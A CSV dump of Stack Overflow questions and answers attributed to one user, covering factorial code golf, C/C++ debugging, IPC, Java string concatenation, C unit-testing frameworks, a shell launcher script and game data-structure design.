QUESTION,USERID,USERNAME,ANSWER
"<p>I want to see all the different ways you can come up with, for a factorial subroutine, or program. The hope is that anyone can come here and see if they might want to learn a new language.</p>

<h2>Ideas:</h2>

<ul>
<li>Procedural</li>
<li>Functional</li>
<li>Object Oriented</li>
<li>One liners</li>
<li>Obfuscated</li>
<li>Oddball</li>
<li>Bad Code</li>
<li><a href=""http://en.wikipedia.org/wiki/Polyglot_%28computing%29"" rel=""nofollow"">Polyglot</a></li>
</ul>

<p>Basically I want to see an example, of different ways of writing an algorithm, and what they would look like in different languages.</p>

<p>Please limit it to one example per entry.
I will allow you to have more than one example per answer, if you are trying to highlight a specific style, language, or just a well thought out idea that lends itself to being in one post.</p>

<p>The only real requirement is it must find the factorial of a given argument, in all languages represented.</p>

<h1>Be Creative!</h1>

<h2>Recommended Guideline:</h2>

<pre>
# Language Name: Optional Style type

   - Optional bullet points

    Code Goes Here

Other informational text goes here
</pre>

<p>I will ocasionally go along and edit any answer that does not have decent formatting.</p>
","9530","Adam Rosenfield","<h1>dc</h1>

<p>Note: clobbers the <code>e</code> and <code>f</code> registers:</p>

<pre><code>[2++d]se[d1-d_1&lt;fd0&gt;e*]sf
</code></pre>

<p>To use, put the value you want to take the factorial of on the top of the stack and then execute <code>lfx</code> (load the <code>f</code> register and execute it), which then pops the top of the stack and pushes that value's factorial.</p>

<p>Explanation: if the top of the stack is <code>x</code>, then the first part makes the top of the stack look like <code>(x, x-1)</code>.  If the new top-of-stack is non-negative, it calls factorial recursively, so now the stack is <code>(x, (x-1)!)</code> for <code>x</code> >= 1, or <code>(0, -1)</code> for <code>x</code> = 0.  Then, if the new top-of-stack is negative, it executes <code>2++d</code>, which replaces the <code>(0, -1)</code> with <code>(1, 1)</code>.  Finally, it multiplies the top two values on the stack.</p>
"
"<p>I have a class in system-C with some data members as such:  </p>

<pre><code>long double x[8];
</code></pre>

<p>I'm initializing it in the construction like this:</p>

<pre><code>for (i = 0; i &lt; 8; ++i) {
    x[i] = 0;
}
</code></pre>

<p>But the first time I use it in my code I have garbage there.</p>

<p>Because of the way the system is built I can't connect a debugger easily.  Are there any methods to set a data breakpoint in the code so that it tells me where in the code the variables were actually changed, but without hooking up a debugger?</p>

<p>Edit:
@<a href=""#56477"" rel=""nofollow"">Prakash</a>: 
Actually, this is a typo in the <em>question</em>, but not in my code...  Thanks!</p>
","9530","Adam Rosenfield","<p>You could try starting a second thread which spins, looking for changes in the variable:</p>

<pre><code>
#include &lt;pthread.h&gt;

void *ThreadProc(void *arg)
{
  volatile long double *x = (volatile long double *)arg;
  while(1)
  {
    for(int i = 0; i &lt; 8; i++)
    {
      if(x[i] != 0)
      {
        __asm__ __volatile__ (""int 3"");  // breakpoint (x86)
      }
  }

  return 0;  // Never reached, but placate the compiler
}
...
pthread_t threadID;
pthread_create(&threadID, NULL, ThreadProc, &x[0]);
</code></pre>

<p>This will raise a SIGTRAP signal to your application whenever any of the x values is not zero.</p>
"
"<p>I'm looking for suggestions on possible IPC mechanisms that are:</p>

<ul>
<li><strong>cross platform</strong> (WIN32 and Linux at least)</li>
<li>Simple to implement in <strong>C++</strong> as well as the <strong>most common scripting languages</strong> (perl, ruby python etc).</li>
<li>Finally, <strong>simple to use</strong> from a programming point of view!</li>
</ul>

<p>What are my options? I'm programming under Linux, but I'd like what I write to be portable to other OSes in the future. I've thought about using sockets, named pipes, or something like DBus.</p>

<p>Does anyone have any advice?</p>
","9530","Adam Rosenfield","<p>Python has a pretty good IPC library: see <a href=""http://docs.python.org/lib/ipc.html"" rel=""nofollow"">http://docs.python.org/lib/ipc.html</a></p>
"
"<p>To commemorate the public launch of Stack Overflow, what's the shortest code to cause a stack overflow? Any language welcome.</p>

<p>ETA: Just to be clear on this question, seeing as I'm an occasional Scheme user: tail-call ""recursion"" is really iteration, and any solution which can be converted to an iterative solution relatively trivially by a decent compiler won't be counted. :-P</p>

<p>ETA2: I've now selected a “best answer”; see <a href=""http://stackoverflow.com/questions/62188/stack-overflow-code-golf/71833#71833"">this post</a> for rationale. Thanks to everyone who contributed! :-)</p>
","9530","Adam Rosenfield","<p>Here's another interesting one from Scheme:</p>

<pre>((lambda (x) (x x)) (lambda (x) (x x)))</pre>
"
"<p>Someone told me it's more efficient to use <code>StringBuffer</code> to concatenate strings in Java than to use the <code>+</code> operator for <code>String</code>s. What happens under the hood when you do that? What does <code>StringBuffer</code> do differently?</p>
","9530","Adam Rosenfield","<p>Because Strings are immutable, each call to the + operator creates a new String object and copies the String data over to the new String.  Since copying a String takes time linear in the length of the String, a sequence of N calls to the + operator results in O(N<sup>2</sup>) running time (quadratic).</p>

<p>Conversely, since a StringBuffer is mutable, it does not need to copy the String every time you perform an Append(), so a sequence of N Append() calls takes O(N) time (linear).  This only makes a significant difference in runtime if you are appending a large number of Strings together.</p>
"
"<p>As everyone knows, the <a href=""http://en.wikipedia.org/wiki/Visual_C%2B%2B"" rel=""nofollow"">Visual C++</a> runtime marks uninitialized or just freed memory blocks with special non-zero markers. Is there any way to disable this behavior entirely without manually setting all uninitialized memory to zeros? It's causing havoc with my valid not null checks, since 0xFEEEFEEE != 0.</p>

<p>Hrm, perhaps I should explain a bit better. I create and initialize a variable (via new), and that all goes just fine. When I free it (via delete), it sets the pointer to 0xFEEEFEEE instead of NULL. When I insert a proper check for NULL, as all good programs that manage their own memory should, I come up with problems as 0xFEEEFEEE passes a NULL check without problems. Is there any good way, other than manually setting all pointers to NULL when deleting them, to detect when memory has already been freed? I would prefer to not use <a href=""http://en.wikipedia.org/wiki/Boost_C%2B%2B_Libraries"" rel=""nofollow"">Boost</a> simply because I don't want the overhead, small though it may be, since that's the only thing I'd be using Boost for.</p>
","9530","Adam Rosenfield","<p>If you build in Release mode instead of Debug mode, the runtime does not fill uninitialized memory at all, but it will still not be zeros.  However, you should <b>not</b> depend on this behavior - you should either explicitly initialize the memory yourself with memset(), ZeroMemory(), or SecureZeroMemory(), or set a flag somewhere indicating that the memory is not yet initialized.  Reading uninitialized memory will result in undefined behavior.</p>
"
"<p>I worked on an embedded system this summer written in straight C.  It was an existing project that the company I work for had taken over.  I have become quite accustomed to writing unit tests in Java using JUnit but was at a loss as to the best way to write unit tests for existing code (which needed refactoring) as well as new code added to the system.</p>

<p>Are there any projects out there that make unit testing plain C code as easy as unit testing Java code with JUnit?  Any insight that would apply specifically to embedded development (cross-compiling to arm-linux platform) would be greatly appreciated.</p>
","9530","Adam Rosenfield","<p>One unit testing framework in C is <a href=""http://check.sourceforge.net/"">Check</a>; a list of unit testing frameworks in C can be found <a href=""http://check.sourceforge.net/doc/check_html/check_2.html#SEC3"">here</a> and is reproduced below.  Depending on how many standard library functions your runtime has, you may or not be able to use one of those.</p>

<blockquote>
  <h3>AceUnit</h3>
  
  <p>AceUnit (Advanced C and Embedded Unit) bills itself as a comfortable C code unit test framework. It tries to mimick JUnit 4.x and includes reflection-like capabilities. AceUnit can be used in resource constraint environments, e.g. embedded software development, and importantly it runs fine in environments where you cannot include a single standard header file and cannot invoke a single standard C function from the ANSI / ISO C libraries. It also has a Windows port. It does not use forks to trap signals, although the authors have expressed interest in adding such a feature. See the <a href=""http://aceunit.sourceforge.net/"">AceUnit homepage</a>.</p>
  
  <h3>GNU Autounit</h3>
  
  <p>Much along the same lines as Check, including forking to run unit tests in a separate address space (in fact, the original author of Check borrowed the idea from GNU Autounit). GNU Autounit uses GLib extensively, which means that linking and such need special options, but this may not be a big problem to you, especially if you are already using GTK or GLib. See the <a href=""http://autounit.tigris.org/"">GNU Autounit homepage</a>.</p>
  
  <h3>cUnit</h3>
  
  <p>Also uses GLib, but does not fork to protect the address space of unit tests.</p>
  
  <h3>CUnit</h3>
  
  <p>Standard C, with plans for a Win32 GUI implementation. Does not currently fork or otherwise protect the address space of unit tests. In early development. See the <a href=""http://cunit.sourceforge.net/"">CUnit homepage</a>.</p>
  
  <h3>CuTest</h3>
  
  <p>A simple framework with just one .c and one .h file that you drop into your source tree. See the <a href=""http://cutest.sourceforge.net/"">CuTest homepage</a>.</p>
  
  <h3>CppUnit</h3>
  
  <p>The premier unit testing framework for C++; you can also use it to test C code. It is stable, actively developed, and has a GUI interface. The primary reasons not to use CppUnit for C are first that it is quite big, and second you have to write your tests in C++, which means you need a C++ compiler. If these don’t sound like concerns, it is definitely worth considering, along with other C++ unit testing frameworks. See the <a href=""http://sourceforge.net/apps/mediawiki/cppunit/index.php?title=Main_Page"">CppUnit homepage</a>.</p>
  
  <h3>embUnit</h3>
  
  <p>embUnit (Embedded Unit) is another unit test framework for embedded systems. This one appears to be superseded by AceUnit. <a href=""http://sourceforge.net/projects/embunit/"">Embedded Unit homepage</a>.</p>
  
  <h3>MinUnit</h3>
  
  <p>A minimal set of macros and that’s it! The point is to show how easy it is to unit test your code. See the <a href=""http://www.jera.com/techinfo/jtns/jtn002.html"">MinUnit homepage</a>.</p>
  
  <h3>CUnit for Mr. Ando</h3>
  
  <p>A CUnit implementation that is fairly new, and apparently still in early development. See the <a href=""http://park.ruru.ne.jp/ando/work/CUnitForAndo/html/"">CUnit for Mr. Ando homepage</a>.</p>
</blockquote>
"
"<p>I want to use a file to store the current version number for a piece of customer software which can be used by a start-up script to run the binary in the correct directory.</p>

<p>For Example, if the run directory looks like this:</p>

<pre><code>.
..
1.2.1
1.2.2
1.3.0
run.sh
current_version
</code></pre>

<p>And current_version contains:</p>

<pre><code>1.2.2
</code></pre>

<p>I want run.sh to descend into 1.2.2 and run the program foo.</p>

<p>The current solution is this:</p>

<pre><code>!#/bin/sh
version = `cat current_version`
cd $version
./foo
</code></pre>

<p>It works but is not very robust.  It does not check for file existence, cannot cope with multiple lines, leading spaces, commented lines, blank files, etc.</p>

<p>What is the most survivable way to do this with either a shell or perl script?</p>
","9530","Adam Rosenfield","<p>You can check for existence using the &amp;&amp; and || operators:</p>

<pre>
!$/bin/sh
version = `cat current_version`
cd $version && ./foo || echo ""Bad version""
</pre>

<p>The &amp;&amp; operator causes the second statement to only execute if the first one succeeds (exit status 0), and the || operator causes the second statement to execute only if the first one fails (exit status non-zero).</p>

<p>I'm not sure what you mean by coping with multiple lines, leading spaces, or commented lines.</p>
"
"<p>I need to calculate Math.exp() from java very frequently, is it possible to get a native version to run faster than java's Math.exp()??</p>

<p>I tried just jni + C, but it's slower than just plain java.</p>
","9530","Adam Rosenfield","<p>The problem with using JNI is the overhead involved in making the call to JNI.  The Java virtual machine is pretty optimized these days, and calls to the built-in Math.exp() are automatically optimized to call straight through to the C exp() function, and they might even be optimized into straight x87 floating-point assembly instructions.</p>
"
"<p>I wanted to ""emulate"" a popular flash game, Chrontron, in C++ and needed some help getting started. (NOTE: Not for release, just practicing for myself)</p>

<pre>
Basics:
Player has a time machine. On each iteration of using the time machine, a parallel state
is created, co-existing with a previous state. One of the states must complete all the
objectives of the level before ending the stage. In addition, all the stages must be able
to end the stage normally, without causing a state paradox (wherein they should have
been able to finish the stage normally but, due to the interactions of another state,
were not).
</pre>

<p>So, that sort of explains how the game works. You should play it a bit to really 
understand what my problem is. <br /></p>

<p>I'm thinking a good way to solve this would be to use linked lists to store each state,
which will probably either be a hash map, based on time, or a linked list that iterates
based on time. I'm still unsure.<br /></p>

<p>ACTUAL QUESTION:</p>

<p>Now that I have some rough specs, I need some help deciding on which data structures to use for this, and why. Also, I want to know what Graphics API/Layer I should use to do this: SDL, OpenGL, or DirectX (my current choice is SDL). And how would I go about implementing parallel states? With parallel threads?</p>

<p>EDIT (To clarify more):<br />
OS -- Windows (since this is a hobby project, may do this in Linux later)<br />
Graphics -- 2D
Language -- C++ (must be C++ -- this is practice for a course next semester)</p>

<p>Q-Unanswered: SDL : OpenGL : Direct X <br />
Q-Answered: Avoid Parallel Processing <br />
Q-Answered: Use STL to implement time-step actions.<br /></p>

<pre>
So far from what people have said, I should:
1. Use STL to store actions.
2. Iterate through actions based on time-step.
3. Forget parallel processing -- period. (But I'd still like some pointers as to how it
could be used and in what cases it should be used, since this is for practice).
</pre>

<p>Appending to the question, I've mostly used C#, PHP, and Java before so I wouldn't describe myself as a hotshot programmer. What C++ specific knowledge would help make this project easier for me? (ie. Vectors?)</p>
","9530","Adam Rosenfield","<p>This sounds very similar to <a href=""http://braid-game.com"">Braid</a>.  You really don't want parallel processing for this - parallel programming is <b>hard</b>, and for something like this, performance should not be an issue.</p>

<p>Since the game state vector will grow very quickly (probably on the order of several kilobytes per second, depending on the frame rate and how much data you store), you don't want a linked list, which has a lot of overhead in terms of space (and can introduce big performance penalties due to cache misses if it is laid out poorly).  For each parallel timeline, you want a vector data structure.  You can store each parallel timeline in a linked list.  Each timeline knows at what time it began.</p>

<p>To run the game, you iterate through all active timelines and perform one frame's worth of actions from each of them in lockstep.  No need for parallel processing.</p>
"
